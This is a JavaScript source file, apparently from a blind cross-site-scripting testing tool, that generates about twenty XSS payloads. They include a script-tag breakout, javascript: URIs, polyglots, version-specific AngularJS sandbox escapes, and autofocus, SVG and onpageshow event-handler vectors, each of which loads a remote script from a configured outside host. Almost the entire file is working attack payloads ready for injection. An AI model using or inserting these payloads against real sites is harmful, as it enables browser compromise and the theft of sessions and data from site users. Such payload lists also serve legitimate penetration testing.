// TODO...
function buildPayloadStructure(payloads) {
  let structuredPayloads = '';
  payloads.map((payload) => {
    structuredPayloads += `Description: ${payload.description}\r\n${payload.payload}\r\n\r\n`;
    return structuredPayloads;
  });
  return structuredPayloads;
}

exports.generatePayloads = (config) => {
  const payloads = [
    { description: 'External JavaScript', payload: `"><script src="//${config.url}/m"></script>` },
    { description: 'JavaScript URI', payload: `javascript:eval("var _ = document.createElement('script');_.src='//${config.url}/m';document.getElementsByTagName('body')[0].appendChild(_)")` },
    { description: 'JavaScript URI href', payload: `"><a href="javascript:eval('var _ = document.createElement(\\'script\\');_.src=\\'//${config.url}/m\\';document.getElementsByTagName(\\'body\\')[0].appendChild(_)')">Click</a>` },
    { description: 'PortSwigger - BurpSuite Polygot Payload', payload: `/*</script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+((new(Image)).src=((new(Image)).src=([]+/\/${config.url}\/m/).replace(/\\/g,[]))//'>` },
    { description: 'crlf - https://polyglot.innerht.ml/ - Polygot Payload', payload: `javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=eval("var _ = document.createElement('script');_.src='//${config.url}/m';document.getElementsByTagName('body')[0].appendChild(_)")//>` },
    { description: 'Mario Heiderch - Angular Payload', payload: `{{constructor.constructor("var _ = document.createElement('script');_.src='//${config.url}/m';document.getElementsByTagName('body')[0].appendChild(_)")()}} ` },
    { description: 'Lewis Ardern/Gareth Heyes - AngularJS Payload', payload: `{{$on.constructor("var _ = document.createElement('script');_.src='//${config.url}/m';document.getElementsByTagName('body')[0].appendChild(_)")()}}` },
    { description: 'Gareth Heyes - 1.2.0 - 1.2.5 - AngularJS Payload', payload: `{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",eval(\`var _=document\\\\x2ecreateElement(\\'script\\');_\\\\x2esrc=\\'//${config.url}/m\\';document\\\\x2ebody\\\\x2eappendChild(_);\`),"')}}`},
    { description: 'Jan Horn - 1.2.6 - 1.2.18 - AngularJS Payload', payload: `{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval("var _ = document.createElement(\\'script\\');_.src=\\'//${config.url}/m\\';document.getElementsByTagName(\\'body\\')[0].appendChild(_)")')()}}`},
    { description: 'Mathias Karlsson - 1.2.19 (FireFox) AngularJS Payload', payload: `{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a",'eval("var _ = document.createElement(\\'script\\');_.src=\\'//${config.url}/m\\';document.getElementsByTagName(\\'body\\')[0].appendChild(_)")'].sort(toString.constructor);}}`},
    { description: 'Gareth Heyes - 1.2.20 - 1.2.29 - AngularJS Payload', payload: `{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",eval(\`var _=document\\\\x2ecreateElement(\\'script\\');_\\\\x2esrc=\\'//${config.url}/m\\';document\\\\x2ebody\\\\x2eappendChild(_);\`),"')}}`},
    { description: 'Gareth Heyes - 1.3.0 - 1.3.9 - AngularJS Payload', payload: `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,eval(\`var _=document\\\\x2ecreateElement(\\'script\\');_\\\\x2esrc=\\'//${config.url}/m\\';document\\\\x2ebody\\\\x2eappendChild(_);\`),a')}}`},
    { description: 'Gareth Heyes - 1.4.0 - 1.5.8 - AngularJS Payload', payload: `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,eval(\`var _=document.createElement(\\'script\\');_.src=\\'//${config.url}/m\\';document.body.appendChild(_);\`),a')}}`},
    { description: 'Jan Horn - 1.5.9 - 1.5.11 - AngularJS Payload', payload: `{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(\`var _=document.createElement(\\\\'script\\\\');_.src=\\\\'//${config.url}/m\\\\';document.body.appendChild(_);\`)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}`},
    { description: 'https://html5sec.org - Self-executing focus event via autofocus', payload: `"><input onfocus=eval("var _ = document.createElement('script');_.src='//${config.url}/m';document.getElementsByTagName('body')[0].appendChild(_)") autofocus>`},
    { description: 'https://html5sec.org - CSS - JavaScript execution via <LINK> href attribute and data URI', payload: `<link rel=stylesheet href=data:,*%7bx:expression(eval("var _ = document.createElement('script');_.src='//${config.url}/m';document.getElementsByTagName('body')[0].appendChild(_)"))%7d`},
    { description: 'https://html5sec.org - HTML5 - JavaScript execution via <FRAMESET> and onload', payload: `<frameset onload=eval("var _ = document.createElement('script');_.src='//${config.url}/m';document.getElementsByTagName('body')[0].appendChild(_)")>`},
    { description: 'https://html5sec.org - SVG - SVG files can force the user agent to execute JavaScript via plain <SCRIPT> tags inside any SVG element without user interaction', payload: `"><svg xmlns="http://www.w3.org/2000/svg"><script>eval("var _ = document.createElement('script');_.src='//${config.url}/m';document.getElementsByTagName('body')[0].appendChild(_)")</script></svg>`},
    { description: 'https://html5sec.org - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known. ', payload: `<body onpageshow="eval('var _ = document.createElement(\\'script\\');_.src=\\'//${config.url}/m\\';document.getElementsByTagName(\\'body\\')[0].appendChild(_)')">`}
  ];
  const structured = buildPayloadStructure(payloads);

  return structured;
};
